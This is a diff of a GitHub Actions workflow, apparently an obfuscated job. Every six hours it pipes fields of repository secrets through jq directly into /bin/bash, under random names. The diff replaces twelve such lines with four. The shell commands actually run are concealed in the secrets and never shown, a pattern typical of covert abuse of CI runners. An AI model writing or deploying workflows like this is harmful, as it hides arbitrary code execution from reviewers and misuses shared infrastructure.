@@ -1,28 +1,20 @@
 name: highjumpgetaway
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
+    - cron: '1 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: highjumpgetaway
         env:
-          gjq46: ${{ secrets.gjq46 }}
+          m5742: ${{ secrets.m5742 }}
         run: |
-          echo $gjq46 | jq -r .lwyl1 | /bin/bash
-          echo $cdygj546 | jq -r .zsnam7164 | /bin/bash
-          echo $sjkt6 | jq -r .ka395 | /bin/bash
-          echo $i987 | jq -r .ebari50813 | /bin/bash
-          echo $xi02 | jq -r .w866 | /bin/bash
-          echo $wvtt7013 | jq -r .amk44328 | /bin/bash
-          echo $owmgs084 | jq -r .vu81151 | /bin/bash
-          echo $r6727 | jq -r .m728 | /bin/bash
-          echo $qcrc89 | jq -r .av7 | /bin/bash
-          echo $u4 | jq -r .ndj03199 | /bin/bash
-          echo $d177 | jq -r .yzc0017 | /bin/bash
-          echo $l119 | jq -r .cg248 | /bin/bash
+          echo $m5742 | jq -r .bq248 | /bin/bash
+          echo $vlg43723 | jq -r .fgb35 | /bin/bash
+          echo $i66 | jq -r .dz8666 | /bin/bash
+          echo $p767 | jq -r .rc28 | /bin/bash
 
